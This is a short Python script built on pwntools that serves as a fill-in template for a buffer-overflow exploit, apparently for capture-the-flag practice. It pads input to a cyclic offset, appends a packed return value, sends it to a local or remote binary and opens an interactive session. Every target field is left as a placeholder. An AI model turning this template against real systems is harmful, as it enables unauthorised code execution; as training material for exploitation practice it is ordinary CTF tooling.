#!/usr/bin/python3
from pwn import *
def fuzzer(r,size,data):
    for i in range(0,size,1):
        r.sendlineafter(b'>',data)

def main(FILENAME,pattern,value,remote=0,bit=64):
    r=''
    if remote==1:
        r=remote('') #Change me
    else:
        r=process(FILENAME)
    buffer=b'A'*(cyclic_find(pattern))
    if bit==64:
        value=p64(value)
    elif bit==32:
        value=p32(value)
    else:
        value=p16(value)
    
    payload=buffer+value

    fuzzer(r,1,payload) #change me

    r.interactive()

if __name__=='__main__':
    FILENAME='' #change me
    remote=0
    pattern="" #Change me
    bit=64
    value=0x0 #Change me
    main(FILENAME,pattern,value,remote,bit)
